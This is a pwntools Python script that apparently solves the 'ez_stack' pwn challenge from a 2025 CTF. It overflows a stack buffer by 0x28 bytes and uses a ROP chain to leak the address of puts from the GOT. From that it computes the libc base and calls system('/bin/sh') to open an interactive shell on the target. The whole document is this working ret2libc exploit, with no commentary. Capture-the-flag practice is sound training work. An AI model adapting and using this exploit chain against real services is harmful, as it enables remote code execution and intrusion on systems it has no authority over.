from pwn import *
from LibcSearcher import *
context(arch='amd64', os='linux', log_level='debug')
# p=process("./pwn")
p=remote("127.0.0.1",9999)
e=ELF("/home/kk/Desktop/MOCSCTF2025-challenge/chall/pwn/ez_stack/題目容器和題目源碼/ezstack/dist/pwn")
libc=ELF("/home/kk/Desktop/MOCSCTF2025-challenge/chall/pwn/ez_stack/題目容器和題目源碼/ezstack/dist/libc.so.6")
pop_rdi=0x0000000000400843
vuln=0x4006E1
main=0x04006A8
puts_got=0x600c48
puts_plt=0x400520
payload=b'a'*0x28+p64(pop_rdi)+p64(puts_got)
payload+=p64(puts_plt)+p64(main)
# gdb.attach(p)
p.sendafter('flag\n',payload)

addr=u64(p.recv(6).ljust(0x8,b'\x00'))
print("=========================>",hex(addr))

addr=addr-libc.sym['puts']
print("=========================>",hex(addr))

ret=0x000000000040050e
binsh=addr+next(libc.search(b"/bin/sh\x00"))
system=addr+libc.sym['system']
pop_rax=0x000000000001b500+addr

payload1=b'a'*0x28+p64(pop_rdi)
payload1+=p64(binsh)+p64(ret)
payload1+=p64(system)

p.sendline(payload1)
p.interactive()
